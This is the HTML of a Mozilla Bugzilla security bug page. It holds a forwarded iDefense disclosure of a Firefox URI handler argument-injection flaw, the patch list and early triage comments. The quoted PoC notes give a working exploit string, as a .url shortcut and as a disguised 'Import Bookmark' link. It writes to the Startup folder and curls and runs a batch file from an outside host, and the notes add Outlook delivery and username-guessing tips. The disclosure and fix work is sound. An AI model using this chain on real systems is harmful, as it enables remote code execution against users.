<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (4 files, 1 obsolete file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9084402">PoC html file</a>
        </div>
        <div>
            <a href="#c0" class="attach-time activity-ref"><span class="rel-time" title="2019-08-09 12:42 PDT" data-time="1565379738">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_280903" ><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div></span>
        </div>
        <div class="attach-info">243 bytes,
          text/html        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9084402&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9084871">URL Shortcut PoC</a>
        </div>
        <div>
            <a href="#c10" class="attach-time activity-ref"><span class="rel-time" title="2019-08-12 14:24 PDT" data-time="1565645099">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_130370" ><a class="email " href="/user_profile?user_id=130370" > <span class="fna">iDefense Vendor Relations</span></a>
</div></span>
        </div>
        <div class="attach-info">462 bytes,
          application/octet-stream        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9084871&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9085406">Scrub args</a>
        </div>
        <div>
            <a href="#c16" class="attach-time activity-ref"><span class="rel-time" title="2019-08-14 03:46 PDT" data-time="1565779570">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.62 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_91159" ><span class="fn">mossop</span>
</div>:
              <a href="#c17"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1565779570"
            >
              feedback-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9085406&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=9085406&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1572838&attachment=9085406">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9086057">Bug 1572838 - ensure osint commandline args are passed appropriately, r?mhowell!,Mossop!</a>
        </div>
        <div>
            <a href="#c20" class="attach-time activity-ref"><span class="rel-time" title="2019-08-16 07:15 PDT" data-time="1565964912">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c35"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1566380728"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c35"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1566381067"
            >
              approval-mozilla-esr68+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_280903" ><span class="fn">abillings</span>
</div>:
              <a href="#c29"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1566200488"
            >
              sec-approval+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9086057&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9086057">Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=9086547">Bug 1572838 - stop processing osint in BrowserContentHandler.jsm, r?dveditz,Mossop</a>
        </div>
        <div>
            <a href="#c27" class="attach-time activity-ref"><span class="rel-time" title="2019-08-19 16:35 PDT" data-time="1566257759">2 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">47 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#a1017204_75935"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1566380730"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#a1017204_75935"
                  class="flag-name-status rel-time-title activity-ref"
                  title="2 years ago"
              data-time="1566381070"
            >
              approval-mozilla-esr68+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9086547&amp;action=edit">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9086547">Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="DuIEy2gE0SNclNocI4AEeiHjSJ8kelhC7sKwqfmioQemdX1F">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="14291017" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" ><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" ><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 12:42 PDT" data-time="1565379738">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9084402"
         class="attachment"
         data-id="9084402" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="firefox.htm">
      <meta itemprop="contentSize" content="243">
      <meta itemprop="encodingFormat" content="text/html">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9084402" itemprop="contentUrl">
        <span id="att-9084402-description" itemprop="description">PoC html file</span></a>
        — <a href="attachment.cgi?id=9084402&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-0" data-comment-id="14291017" data-ismarkdown="true" ><p>The following email received from <a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a></p>
<p>-------- Forwarded Message --------<br>
Subject: 	Fwd: iDefense Vendor Notification - [V-bsk2ottbf1]<br>
Date: 	Fri, 9 Aug 2019 17:51:29 +0000<br>
From: 	Vendor Disclosure &lt;<a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a>&gt;<br>
To: 	<a href="mailto:security@mozilla.org" rel="nofollow">security@mozilla.org</a> &lt;<a href="mailto:security@mozilla.org" rel="nofollow">security@mozilla.org</a>&gt;<br>
CC: 	Vendor Disclosure &lt;<a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a>&gt;</p>
<p>Please find the attached report and PoC for this issue.</p>
<p>Thanks,<br>
Rohit Mothe<br>
iDefense Labs</p>
<p>-------- Forwarded Message --------<br>
Subject: 	iDefense Vendor Notification - [V-bsk2ottbf1]<br>
Date: 	Fri, 9 Aug 2019 17:48:58 +0000<br>
From: 	<a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a> &lt;<a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a>&gt;<br>
Reply-To: 	<a href="mailto:vendor-disclosure@idefense.com" rel="nofollow">vendor-disclosure@idefense.com</a><br>
To: 	<a href="mailto:security@mozilla.org" rel="nofollow">security@mozilla.org</a></p>
<p>iDefense has identified a vulnerability. This vulnerability was submitted to iDefense through our Vulnerability Contributor Program:</p>
<p><a href="https://vcp.idefense.com/" rel="nofollow">https://vcp.idefense.com/</a></p>
<p>iDefense Labs has validated this vulnerability and has drafted the attached advisory.Additionally, proof-of-concept code is available on request.</p>
<p>IMPORTANT: Please be sure to copy at least one of the &#39;[V-bsk2ottbf1]&#39; number(s) from this email&#39;s subject line into the subject for any emails sent as a reply.<br>
Omission of this information from the subject line will cause emails sent by you to be automatically deleted when processed by the iDefense email SPAM<br>
filters.</p>
<p>In accordance with our vendor disclosure policy<br>
( <a href="https://vcp.idefense.com/assets/VCP_Responsible_Disclosure_Policy_4_23_18.pdf" rel="nofollow">https://vcp.idefense.com/assets/VCP_Responsible_Disclosure_Policy_4_23_18.pdf</a> ),<br>
we request that you acknowledge receipt of this initial notification within five business days.Our intent is to begin the process of coordinating an appropriate public disclosure date for this issue that will provide your company with adequate time to develop a patch or workaround to mitigate this vulnerability. If you have questions regarding this issue or require further details to assist with your analysis, please do not hesitate to contact us.</p>
<p>It is always our goal to coordinate on the public disclosure of patches/advisories as quickly as possible after a vulnerability is discovered.If, however, a reasonable time-frame cannot be agreed upon for this issue,it will be publicly released in 60 days on 10/08/2019<br>
iDefense is willing to work with a vendor to find a mutually agreeable release date beyond this time-frame so long as the vendor continues to make good faith<br>
efforts to produce patches in a timely fashion and regularly informs iDefense of their progress in doing so.</p>
<p>Please note that if the affected product is included within other applications and/or operating systems, iDefense will not be coordinating disclosure of the vulnerability to affected third parties. We ask that you handle this coordination separately.</p>
<p>Regards,</p>
<p>iDefense Vendor Liaison<br>
iDefense Labs</p>
<hr>
<p>Submissions included in this notification:</p>
<p>V-bsk2ottbf1 : Mozilla Firefox URI Handler Command Injection Vulnerability (iDefense Zero Day)</p>
<hr>
<p>See the attached files for details regarding the above submissions.</p>
<hr>
<p>The attached text file, V-bsk2ottbf1.txt, contains:</p>
<p>iDefense VCP Submission V-bsk2ottbf1<br>
08/09/2019<br>
Mozilla Firefox URI Handler Command Injection Vulnerability (iDefense Zero Day)</p>
<p>Description:<br>
Remote exploitation of an input validation vulnerability in Mozilla Foundation&#39;s Firefox could allow an attacker to execute arbitrary code with the privileges of the current user.</p>
<p>Analysis:<br>
An input validation vulnerability has been identified in Firefox. Specifically, the error occurs in the URI Handler component in the way it improperly sanitizes MOZ_LOG and MOZ_LOG_FILE arguments. This can lead to command injection attacks.</p>
<p>Credit:<br>
Ping Fan (Zetta) Ke of VXRL working with iDefense Labs (<a href="https://vcp.idefense.com/" rel="nofollow">https://vcp.idefense.com/</a>)</p>
<p>Attached PoC.zip contains notes.text and a firefox.htm PoC file. Notes.text states:</p>
<p>Firefox URI Handler RCE</p>
<p>== Update 1 ==</p>
<p>I have checked the payload with the recent version 68 (instead of 67 in PoC) and found that the exploit is not very stable. In many cases the user has to manually kill the Firefox process in order to write the payload into the start up folder properly. However, one can simply add the -P argument (or -profile or -migration) to force Firefox to peacefully shut down, but the tradeoff is the user will see a message box regarding import profile. Yet, the benefit of using this -P argument is even if the user is running Firefox, he or she will still get infected, which is not the case with the previous payload.</p>
<p>-- Steps to reproduce the payload --<br>
To reproduce, one can simply create a .url shortcut:</p>
<pre><code>FirefoxURL-308046B0AF4A39CB:&quot; -P -MOZ_LOG=raw,Widget:4 -MOZ_LOG_FILE=&quot;C:/Users/IEUser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/&amp;cd ..&amp;cd ..&amp;cd Users&amp;cd Public&amp;curl -o z.bat poc.mm2.in&amp;z.bat
</code></pre>
<p>The additional -P argument makes the exploit more reliable, and note that one need to change <code>IEUser</code> to the victim&#39;s Windows user name. This requires addition information gathering on the user&#39;s profile.</p>
<p>Alternatively, one can leverage certain Windows Apps like Microsoft Outlook as shown in the PoC video. To reproduce like in the PoC video, send the following htm file as attachment to the victim:</p>
<pre><code>&lt;a href=&#39;FirefoxURL-308046B0AF4A39CB:&quot; -P -MOZ_LOG=raw,Widget:4 -MOZ_LOG_FILE=&quot;C:/Users/IEUser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/&amp;cd ..&amp;cd ..&amp;cd Users&amp;cd Public&amp;curl -o z.bat poc.mm2.in&amp;z.bat&#39;&gt;Import Bookmark to Firefox&lt;/a&gt; 
</code></pre>
<p>The victim will then open the htm file in preview mode, so that the payload should be shown in Outlook instead of the default browser. Then if the victim click on the link, it will trigger the exploit.</p>
<p>-- Technical detail --<br>
This exploit is chaining two features, argument injection (e.g. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000006">CVE-2018-1000006</a>) and writing executable file in start up directory (e.g. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250">CVE-2018-20250</a>). Interestingly, Firefox has an argument injection vulnerability in 12 years ago (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3670">CVE-2007-3670</a>), and fixed with the additional flag -osint (e.g. in nsAppRunner.cpp). However, the recent -MOZ_LOG and -MOZ_LOG_FILE arguments do not have checking with the -osint flag (in LogCommandLineHandler.cpp), causing this vulnerability to resurrect.</p>
<p>The -MOZ_LOG and -MOZ_LOG_FILE allow arbitrary log file writing in arbitrary location, but the payload has to be crafted carefully in order to have meaningful code execution. Fortunately, the <code>Widget</code> log module will record the file access activities, so one could reflectively write the payload in the file name to do arbitrary code execution. In the example payload, it uses the built-in curl to download the payload from poc.mm2.in (which is just calc), and write to the Public folder and execute it.</p>
<p>The major browsers have already encode the URL when executing (e.g. &quot; becomes %22), so if one open the htm payload with Chrome or Firefox itself, it will not trigger the exploit. Yet, many Windows Apps (e.g. Microsoft Office) do not do the encoding as the custom URIs are used for IPC, so it still have a great opportunity to launch such an attack.</p>
<p>On the other hand, unlike <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250">CVE-2018-20250</a>, the execution base of Firefox is not in a user folder, so using directory traversal trick to write in start up is not feasible. Using variable such as %APPDATA% is also not working unlike <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8311">CVE-2018-8311</a>. So one need to guess the Windows username. In many organizations like the universities that I have worked in, the Windows username is simply the email address name. As the payload is delivered through email, attackers could target employees in an organization if they could gather the email information.</p>
<p>Reference:<br>
<a href="https://github.com/mozilla/gecko-dev/blob/9c99764b14a5e5ef806cf56f4ce276a7c9de25e0/toolkit/xre/nsAppRunner.cpp" rel="nofollow">https://github.com/mozilla/gecko-dev/blob/9c99764b14a5e5ef806cf56f4ce276a7c9de25e0/toolkit/xre/nsAppRunner.cpp</a><br>
<a href="https://github.com/mozilla/gecko-dev/blob/265e6721798a455604328ed5262f430cfcc37c2f/xpcom/base/LogCommandLineHandler.cpp" rel="nofollow">https://github.com/mozilla/gecko-dev/blob/265e6721798a455604328ed5262f430cfcc37c2f/xpcom/base/LogCommandLineHandler.cpp</a></p>
</div></div><div class="change-set" id="c1"><div class="comment" data-id="14291051" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" ><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_406194" ><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 13:03 PDT" data-time="1565381033">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-1" data-comment-id="14291051" data-ismarkdown="true" ><p>I don&#39;t really know what is going on here, but this looks related to the issue in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1430964" title="RESOLVED FIXED - FirefoxURL regex check in browser/components/nsBrowserContentHandler.js should be case-insensitive">bug 1430964</a>. It looks like there&#39;s a regexp that tries to catch these in BrowserContentHandler.jsm, but presumably it misses this particular case because of the weird junk after FirefoxURL, but whatever it is being passed to is okay with the junk.</p>
</div></div><div class="change-set" id="a1304_406194"><div class="change" id="aa1304_406194">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a1304_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_406194" id="a1304_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1304_406194"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1304_406194">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a1304_406194">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 13:04 PDT" data-time="1565381042">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: needinfo?(gijskruitbosch+bugs)</div></div></div><div class="change-set" id="c2"><div class="comment" data-id="14291058" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_406194" id="a1304_406194"><img src="https://secure.gravatar.com/avatar/0a70c84cd33dba0151fe15f2f8773137?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_406194" id="a1304_406194"><a class="email " href="/user_profile?user_id=406194" > <span class="fna">Andrew McCreight [:mccr8]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 13:05 PDT" data-time="1565381126">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-2" data-comment-id="14291058" data-ismarkdown="true" ><p>Maybe that&#39;s completely unrelated, but hopefully Gijs has more of an idea what might be going wrong here than me.</p>
</div></div><div class="change-set" id="a4244_1689"><div class="change" id="aa4244_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a4244_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a4244_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a4244_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4244_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a4244_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 13:53 PDT" data-time="1565383982">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Duplicate of this bug: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1572839">1572839</a></div></div></div><div class="change-set" id="a4311_1689"><div class="change" id="aa4311_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a4311_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a4311_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a4311_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4311_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a4311_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 13:54 PDT" data-time="1565384049">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Summary: V-bsk2ottbf1 : Mozilla Firefox URI Handler Command Injection Vulnerability (iDefense Zero Day) &rarr; URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]</div></div></div><div class="change-set" id="a6270_1689"><div class="change" id="aa6270_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a6270_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a6270_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a6270_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#a6270_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-09 14:26 PDT" data-time="1565386008">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Component: General &rarr; Startup and Profile System</div><div class="change">Product: Firefox &rarr; Toolkit</div><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability"
   href="/show_bug.cgi?id=384384">IDEF2595</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Add -MOZ_LOG and -MOZ_LOG_FILE arguments"
   href="/show_bug.cgi?id=1443892">1443892</a></div></div></div><div class="change-set" id="c4"><div class="comment" data-id="14292470" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_434339" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/9a0a16bc1cb5b0144e373deb8e357804?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_434339" id="a6270_1689"><a class="email disabled" href="/user_profile?user_id=434339" > <span class="fna">Paul Theriault [:pauljt] (no longer reading bugmail)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-11 22:27 PDT" data-time="1565587678">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
